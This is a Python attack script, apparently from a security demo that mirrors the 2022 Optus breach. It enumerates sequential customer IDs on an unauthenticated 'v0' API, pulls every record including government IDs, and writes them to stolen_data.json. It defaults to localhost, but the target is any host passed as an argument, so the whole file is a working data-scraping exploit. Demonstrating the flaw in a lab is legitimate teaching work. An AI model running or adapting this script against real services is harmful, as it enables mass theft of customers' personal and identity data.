#!/usr/bin/env python3
"""
Enumeration attack against the v0 vulnerable API.

Mirrors the 2022 Optus-style breach: because the API requires no authentication
and uses sequential customer IDs, we can simply count from 1 to N and pull every
record. Uses only the Python standard library (no pip install needed).

Usage:
    python enumerate.py                 # attacks http://localhost:8080
    python enumerate.py http://host:port
"""

import json
import sys
import time
import urllib.error
import urllib.request

DEFAULT_BASE = "http://localhost:8080"


def get_count(base):
    with urllib.request.urlopen(f"{base}/v0/api/customers/count") as r:
        return json.load(r)["total"]


def dump(base):
    total = get_count(base)
    print(f"[*] Target reports {total} records. Enumerating 1..{total} with no credentials.\n")

    start = time.time()
    stolen = []
    for i in range(1, total + 1):
        try:
            with urllib.request.urlopen(f"{base}/v0/api/customers/{i}") as r:
                stolen.append(json.load(r))
        except urllib.error.HTTPError:
            pass  # gaps are fine, keep counting
        if i % 1000 == 0:
            print(f"    pulled {i} / {total} ...")

    elapsed = time.time() - start
    print(f"\n[+] Exfiltrated {len(stolen)} records in {elapsed:.1f}s "
          f"({len(stolen) / elapsed:.0f} records/sec)")

    if stolen:
        print("\n[+] Sample stolen record (note the leaked governmentId):")
        print(json.dumps(stolen[0], indent=2))

    with open("stolen_data.json", "w") as f:
        json.dump(stolen, f, indent=2)
    print("\n[+] Full dataset written to stolen_data.json")


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    dump(base.rstrip("/"))
